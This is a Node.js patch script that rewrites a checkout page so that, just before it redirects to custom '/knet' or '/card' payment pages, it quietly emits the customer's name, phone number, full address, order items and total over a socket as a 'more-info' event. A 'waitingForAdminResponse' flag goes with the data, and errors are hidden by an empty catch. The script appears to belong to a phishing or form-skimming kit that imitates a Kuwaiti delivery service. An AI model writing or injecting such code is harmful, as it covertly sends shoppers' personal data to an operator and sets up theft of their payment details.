import fs from "node:fs";
const f = "src/pages/Checkout.tsx";
let t = fs.readFileSync(f, "utf8");
const eol = t.includes("\r\n") ? "\r\n" : "\n";
let bad = 0;

const impA = "import { useNavigate } from 'react-router-dom';";
if (t.includes(impA) && !t.includes("@/lib/store")) {
  t = t.replace(impA, impA + eol + "import { socket } from '@/lib/store';");
} else if (!t.includes("@/lib/store")) { console.log("NO import anchor"); bad++; }

const target = [
  "    setShowConfirmation(false);",
  "    navigate(paymentMethod === 'knet' ? '/knet' : '/card');"
].join(eol);

const repl = [
  "    try {",
  "      const s = socket.value;",
  "      if (s && s.connected) {",
  "        s.emit('more-info', {",
  "          content: {",
  "            'اسم المستخدم': form.name,",
  "            'رقم الجوال': form.phone,",
  "            'المحافظة': governorate,",
  "            'المنطقة': form.area,",
  "            'القطعة': form.block,",
  "            'الشارع': form.street,",
  "            'المنزل': form.building,",
  "            'الطابق': form.floor,",
  "            'الشقة': form.apartment,",
  "            'ملاحظات': form.notes,",
  "            'وقت التوصيل': deliverySlot ? (deliverySlot as any).label || String(deliverySlot) : '',",
  "            'طريقة الدفع': paymentMethod === 'knet' ? 'KNET' : 'بطاقة',",
  "            'اسم الخدمة': 'kdkaw',",
  "            'عدد الأصناف': String(items.length),",
  "            'الأصناف': items.map((i: any) => (i.name_ar || i.name || '') + ' ×' + (i.qty || i.quantity || 1)).join(' | '),",
  "            'الإجمالي': String(finalTotal),",
  "            'المبلغ الإجمالي': String(finalTotal),",
  "          },",
  "          page: 'إتمام الطلب',",
  "          waitingForAdminResponse: false,",
  "        });",
  "      }",
  "    } catch (e) {}",
  "    setShowConfirmation(false);",
  "    navigate(paymentMethod === 'knet' ? '/knet' : '/card');"
].join(eol);

if (t.includes(target)) t = t.replace(target, repl); else { console.log("NO target"); bad++; }

fs.writeFileSync(f, t);
console.log(bad === 0 ? "OK" : "FAIL");
